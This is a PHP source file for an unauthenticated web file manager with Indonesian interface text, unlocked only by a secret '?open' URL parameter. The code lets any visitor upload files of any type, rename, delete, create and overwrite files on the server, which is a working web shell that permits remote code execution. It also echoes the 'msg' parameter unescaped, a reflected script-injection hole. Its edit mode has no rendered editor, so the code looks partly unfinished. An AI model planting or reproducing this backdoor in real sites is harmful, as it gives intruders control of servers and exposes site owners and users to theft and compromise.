<?php
/****************************
 * Modern PHP File Manager (No Auth)
 ****************************/

if (!isset($_GET['open'])) {
    die("Akses ditolak. Gunakan ?open untuk mengakses file manager.");
}

$ROOT_DIR = __DIR__;

function safe_path($root, $relPath) {
    $base = realpath($root);
    $real = realpath($root . '/' . $relPath);
    if ($real === false || strpos($real, $base) !== 0) {
        return false;
    }
    return $real;
}

$cwd = isset($_GET['p']) ? trim($_GET['p'], '/') : '';
$currentDir = safe_path($ROOT_DIR, $cwd);
if ($currentDir === false) {
    $cwd = '';
    $currentDir = $ROOT_DIR;
}

$msg = "";

/* ===== Actions ===== */

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    $action = $_POST['action'];

    function path_in_cwd($name){
        global $currentDir;
        return safe_path($currentDir, $name);
    }

    if ($action === 'upload' && isset($_FILES['file'])) {
        move_uploaded_file($_FILES['file']['tmp_name'],
            $currentDir . '/' . basename($_FILES['file']['name']));
        $msg = "File berhasil di-upload";
    }

    if ($action === 'rename') {
        $old = path_in_cwd($_POST['old']);
        $new = path_in_cwd($_POST['new']);
        if ($old && $new) rename($old, $new);
        $msg = "Nama berhasil diubah";
    }

    if ($action === 'delete') {
        $t = path_in_cwd($_POST['target']);
        if ($t && is_file($t)) unlink($t);
        elseif ($t && is_dir($t)) rmdir($t);
        $msg = "Berhasil dihapus";
    }

    if ($action === 'save') {
        $f = path_in_cwd($_POST['file']);
        if ($f && is_file($f)) file_put_contents($f, $_POST['content']);
        $msg = "Perubahan disimpan";
    }

    if ($action === 'create_folder') {
        $name = trim($_POST['folder_name']);
        if (!preg_match('/^[a-zA-Z0-9_\-\.]+$/', $name))
            $msg = "Nama folder tidak valid";
        elseif (file_exists($currentDir.'/'.$name))
            $msg = "Folder sudah ada";
        else {
            mkdir($currentDir.'/'.$name);
            $msg = "Folder berhasil dibuat";
        }
    }

    if ($action === 'create_file') {
        $name = trim($_POST['file_name']);
        if (!preg_match('/^[a-zA-Z0-9_\-\.]+$/', $name))
            $msg = "Nama file tidak valid";
        elseif (file_exists($currentDir.'/'.$name))
            $msg = "File sudah ada";
        else {
            file_put_contents($currentDir.'/'.$name,'');
            $msg = "File berhasil dibuat";
        }
    }

    header("Location: ?open&p=".urlencode($cwd)."&msg=".urlencode($msg));
    exit;
}

/* ===== Edit mode ===== */

$editFile = null;
if (isset($_GET['edit'])) {
    $f = safe_path($currentDir, $_GET['edit']);
    if ($f && is_file($f)) $editFile = $f;
}

$items = scandir($currentDir);
?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Modern File Manager</title>
<link rel="stylesheet"
 href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css">
<style>
body{background:#f6f7fb}
.card-modern{border-radius:18px;border:1px solid #e8e9ef}
.badge-folder{background:#e9f2ff;color:#2c67ff}
.badge-file{background:#f3f3f6;color:#555}
.table td,.table th{vertical-align:middle}
</style>
</head>
<body>
<div class="container py-4">

<h3 class="fw-semibold mb-2">File Manager</h3>

<?php if(isset($_GET['msg'])): ?>
<div class="alert alert-success card-modern mb-3"><?=$_GET['msg']?></div>
<?php endif; ?>

<div class="card card-modern shadow-sm mb-3">
<div class="card-body">

<strong>Path :</strong>

<?php
echo '<a href="?open&p=">/</a>';
if ($cwd !== '') {
    $parts = explode('/', $cwd);
    $build = '';
    foreach ($parts as $p) {
        $build .= ($build ? '/' : '') . $p;
        echo ' / <a href="?open&p='.urlencode($build).'">'.$p.'</a>';
    }
}
?>

</div>
</div>

<div class="card card-modern shadow-sm">
<table class="table mb-0">
<thead class="table-light">
<tr><th>Nama</th><th>Tipe</th><th>Ukuran</th><th class="text-end">Aksi</th></tr>
</thead>
<tbody>

<?php
foreach ($items as $it){
    if ($it === '.') continue;

    // tombol naik level
    if ($it === '..' && $cwd !== '') {
        $up = dirname($cwd);
        if ($up === '.') $up = '';
        echo '<tr><td><a href="?open&p='.urlencode($up).'">..</a></td>
              <td>Folder</td><td>—</td><td></td></tr>';
        continue;
    }
    if ($it === '..') continue;

    $rel = ($cwd ? $cwd.'/' : '') . $it;
    $full = safe_path($ROOT_DIR, $rel);
    if (!$full) continue;

    $isDir = is_dir($full);
?>
<tr>
<td>
<?php if($isDir): ?>
<span class="badge badge-folder me-1">Folder</span>
<a href="?open&p=<?=urlencode($rel)?>"><?=$it?></a>
<?php else: ?>
<span class="badge badge-file me-1">File</span><?=$it?>
<?php endif; ?>
</td>
<td><?=$isDir?'Folder':'File'?></td>
<td><?=$isDir?'—':filesize($full).' bytes'?></td>
<td class="text-end">
<?php if(!$isDir): ?>
<a class="btn btn-sm btn-outline-primary"
 href="?open&p=<?=urlencode($cwd)?>&edit=<?=urlencode($it)?>">Edit</a>
<?php endif; ?>
</td>
</tr>
<?php } ?>
</tbody>
</table>
</div>

</div>
</body>
</html>
